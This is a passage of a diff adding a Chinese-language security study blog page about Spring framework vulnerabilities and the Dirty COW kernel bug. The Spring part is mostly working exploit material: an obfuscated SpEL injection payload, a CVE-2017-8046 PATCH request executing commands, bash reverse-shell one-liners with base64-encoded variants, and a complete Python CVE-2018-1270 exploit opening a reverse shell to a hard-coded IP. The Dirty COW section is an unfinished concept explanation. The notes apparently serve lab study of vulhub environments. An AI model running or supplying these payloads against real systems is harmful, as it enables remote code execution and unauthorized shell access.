class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">67</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">121</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">78</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">105</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">56</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">79</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">68</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">103</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">73</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">68</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">43</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">74</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">106</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">69</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">61</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">125</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">124</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">123</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">101</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">54</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">52</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">44</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">45</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">100</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">125</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">124</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">123</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">104</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">44</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">45</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">105</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">125</span>)))&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后使用nc监听即可</p>
+</blockquote>
+<p>引发原因：Spring Security OAuth是为Spring框架提供安全认证支持的一个模块。在其使用 whitelabel views来处理错误时，由于使用 SpEL，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p>
+<h4 id="在是CVE-2017-4971"><a href="#在是CVE-2017-4971" class="headerlink" title="在是CVE-2017-4971"></a>在是<strong>CVE-2017-4971</strong></h4><p>以下内容是根据<a target="_blank" rel="noopener" href="https://paper.seebug.org/322/%E5%BE%97%E6%9D%A5%E7%9A%84">https://paper.seebug.org/322/得来的</a></p>
+<p>原理：</p>
+<blockquote>
+<p>首先我们看Spring Web Flow的这个类</p>
+<p><img src="/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-2.png" srcset="/img/loading.gif" lazyload alt="image-20220304172110759"></p>
+<p>里面有这一行代码,是通过浏览器接收field然后进行SpringEL解析</p>
+<p><img src="/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-3.png" srcset="/img/loading.gif" lazyload alt="image-20220304172140273"></p>
+</blockquote>
+<p><img src="/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-1.png" srcset="/img/loading.gif" lazyload alt="image-20220304165837541"></p>
+<h4 id="CVE-2017-8046"><a href="#CVE-2017-8046" class="headerlink" title="CVE-2017-8046"></a><strong>CVE-2017-8046</strong></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/customers/1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json-patch+json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>202<br><br><span class="language-haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">116</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>vulhub<span class="hljs-string">&quot; &#125;]</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>构造poc</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/ip/</span><span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwOS45Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br><br><span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-keyword">join</span>(map(str, (map(ord,<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwOS45Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>))))<br></code></pre></td></tr></table></figure>
+
+<p><strong>CVE-2018-1270</strong></p>
+<p>使用自带的POC即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><br>logging.basicConfig(stream=sys.stdout, level=logging.INFO)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">random_str</span>(<span class="hljs-params">length</span>):<br>    letters = string.ascii_lowercase + string.digits<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SockJS</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url, *args, **kwargs</span>):<br>        <span class="hljs-built_in">super</span>().__init__(*args, **kwargs)<br>        self.base = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/<span class="hljs-subst">&#123;random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)&#125;</span>/<span class="hljs-subst">&#123;random_str(<span class="hljs-number">8</span>)&#125;</span>&#x27;</span><br>        self.daemon = <span class="hljs-literal">True</span><br>        self.session = requests.session()<br>        self.session.headers = &#123;<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: url,<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br>        &#125;<br>        self.t = <span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.base&#125;</span>/htmlfile?c=_jp.vulhub&#x27;</span><br>        response = self.session.get(url, stream=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.iter_lines():<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, command, headers, body=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        data = [command.upper(), <span class="hljs-string">&#x27;\n&#x27;</span>]<br><br>        data.append(<span class="hljs-string">&#x27;\n&#x27;</span>.join([<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;k&#125;</span>:<span class="hljs-subst">&#123;v&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> headers.items()]))<br><br>        data.append(<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>        data.append(body)<br>        data.append(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>        data = json.dumps([<span class="hljs-string">&#x27;&#x27;</span>.join(data)])<br><br>        response = self.session.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.base&#125;</span>/xhr_send?t=<span class="hljs-subst">&#123;self.t&#125;</span>&#x27;</span>, data=data)<br>        <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">204</span>:<br>            logging.info(<span class="hljs-string">f&quot;send &#x27;<span class="hljs-subst">&#123;command&#125;</span>&#x27; data error.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            logging.info(<span class="hljs-string">f&quot;send &#x27;<span class="hljs-subst">&#123;command&#125;</span>&#x27; data success.&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):<br>        self.session.close()<br><br><br>sockjs = SockJS(<span class="hljs-string">&#x27;http://175.24.4.26:8080/gs-guide-websocket&#x27;</span>)<span class="hljs-comment"># 这里修改ip</span><br>sockjs.start()<br>time.sleep(<span class="hljs-number">1</span>)<br><br>sockjs.send(<span class="hljs-string">&#x27;connect&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;accept-version&#x27;</span>: <span class="hljs-string">&#x27;1.1,1.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;heart-beat&#x27;</span>: <span class="hljs-string">&#x27;10000,10000&#x27;</span><br>&#125;)<br><br><span class="hljs-comment">#这里修改命令</span><br>sockjs.send(<span class="hljs-string">&#x27;subscribe&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;selector&#x27;</span>: <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuNC4yNi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>,<br>    <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;sub-0&#x27;</span>,<br>    <span class="hljs-string">&#x27;destination&#x27;</span>: <span class="hljs-string">&#x27;/topic/greetings&#x27;</span><br>&#125;)<br><br>data = json.dumps(&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;vulhub&#x27;</span>&#125;)<br>sockjs.send(<span class="hljs-string">&#x27;send&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;content-length&#x27;</span>: <span class="hljs-built_in">len</span>(data),<br>    <span class="hljs-string">&#x27;destination&#x27;</span>: <span class="hljs-string">&#x27;/app/hello&#x27;</span><br>&#125;, data)<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="防御方法-升级高版本即可"><a href="#防御方法-升级高版本即可" class="headerlink" title="防御方法:升级高版本即可"></a><strong>防御方法:升级高版本即可</strong></h4><h3 id="脏牛漏洞-Copy-On-Write-简称伪COW所以被称为脏牛"><a href="#脏牛漏洞-Copy-On-Write-简称伪COW所以被称为脏牛" class="headerlink" title="脏牛漏洞(Copy On Write 简称伪COW所以被称为脏牛)"></a>脏牛漏洞(Copy On Write 简称伪COW所以被称为脏牛)</h3><p>由于条件竞争导致越权</p>
+<p>首先讲解一下<strong>原子性操作</strong></p>
+<blockquote>
+<p>从汇编层面能用一行机器码描述的就是原子性操作不能用一行机器码描述的就不是原子性操作</p>
+</blockquote>
+<p>例如a b 交换</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,a<br><span class="hljs-keyword">mov</span> a,b<br><span class="hljs-keyword">mov</span> b,<span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure>
+
+<p>从道理上面看上面的a和b交换没有任何问题,但是如果是多线程环境,a是一个全局变量并且在mov eax,a的过程中另一个线程调用了mov a,b并且又执行了其他的操作那就可能导致a的值并不是我们想要的</p>
+<blockquote>
+<p>只用一行c语言代码是伪原子性的,因为c语言的一行代码可能对应着汇编语言的多层代码</p>
+</blockquote>
+<p>例如:</p>
+<blockquote>
+<p>c语言代码:</p>
+<p>int a &#x3D; (b*c)&lt;&lt;5;</p>
+<p>汇编:</p>
+<p>mov eax,b</p>
+<p>mul eax,c</p>
+<p>shl eax,5</p>
+<p>mov a,eax</p>
+</blockquote>
+<p><strong>我们再来讲一下double checked locking if-condition(双重检查if条件锁)的问题</strong></p>
+<p>它是用来对多线程的安全进行检查</p>
+<p>初级版本的修复(如果更安全的调用构造函数)</p>
+<p>如果存在一个类,有多个线程的多个函数都需要用到他的实例(COW页),并且在这些函数的整个函数过程都需要保证原子独占一个实例,我们会维护一张表(对应着内核的页表,用来记录所有指向该类的指针,且每个实例正常情况下只有一个指向它的指针)</p>
+<p>如果该页表用光了在不了解double checked locking if-condition的情况下会这么写</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br><br>	<span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>          helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>          <span class="hljs-keyword">return</span> helper;<br>       &#125;<br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>	&#125;<br>&#125;<br><br>**这里假设getInstance是用完页表需要重新分配一个页表的函数,暂时不写使用页表的函数**<br></code></pre></td></tr></table></figure>
+
+<p>上面这种写法的危害</p>
+<p>由于内核是多线程的如果没有加锁可能导致问题的出现</p>
+<p>改版-1</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br>	<span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       lock();<span class="hljs-comment">//加锁</span><br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>          helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>          <span class="hljs-keyword">return</span> helper;<br>       &#125;<br>       unlock();<span class="hljs-comment">//解锁</span><br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样改,加锁的范围太大了,如果不需要if里面的操作他也会需要等待锁</p>
+<p>改版-2</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br>	<span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       <br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>       lock();<span class="hljs-comment">//加锁</span><br>           helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>          <span class="hljs-keyword">return</span> helper;<br>      unlock();<span class="hljs-comment">//解锁</span><br>       &#125;<br><br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这种改版导致经典的线程问题(new 是伪原子的,大约三个操作)</p>
+<p>改版-3</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>&#123;<br>	<span class="hljs-type">Needed</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> NULL<br>     <span class="hljs-keyword">public</span> Needed <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">if</span>(helper == NULL)&#123;   <span class="hljs-comment">//在这里如果为空那就新建一个页表</span><br>       lock();<span class="hljs-comment">//加锁</span><br>           <span class="hljs-keyword">if</span>(helper == NULL)&#123;<br>             helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Needed</span>();<br>             <span class="hljs-keyword">return</span> helper;<br>           &#125;<br>      unlock();<span class="hljs-comment">//解锁</span><br>       &#125;<br><br>       ...... <span class="hljs-comment">//如果不为空那就返回一个可用的页表这里不写详细的操作了</span><br>       <span class="hljs-keyword">return</span> helper;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>经典解决方法,也是double checked lock if-condition方法</p>
+<p>但是这种方法仍然不是最安全的,这也是脏牛利用这种不安全导致的</p>
+<p>接下来回到脏牛的问题上面</p>
+<p>首先理解一下<strong>私有版本(PRIVATE_COPY)</strong></p>
+<p>将内存中一块缓存映射到硬盘中,但是如果读操作是对内存中的数据进行而不是对硬盘中的数据进行读</p>
+<p>内存中的副本可以被任意写入,但是不允许被回写到硬盘中(这种操作类似于vim打开一个只读文件你可以写数据但是不能保存),<strong>所以只要能将内存中的数据写回那就能造成脏牛漏洞了</strong></p>
+<p>当我们操作一个read-only的时候我们操作的是他的副本并不是原件</p>
+<p>找找工作再看吧</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV18Q4y1i7Ld?from=search&amp;seid=15043089374979084029&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV18Q4y1i7Ld?from=search&amp;seid=15043089374979084029&amp;spm_id_from=333.337.0.0</a></p>
+</blockquote>
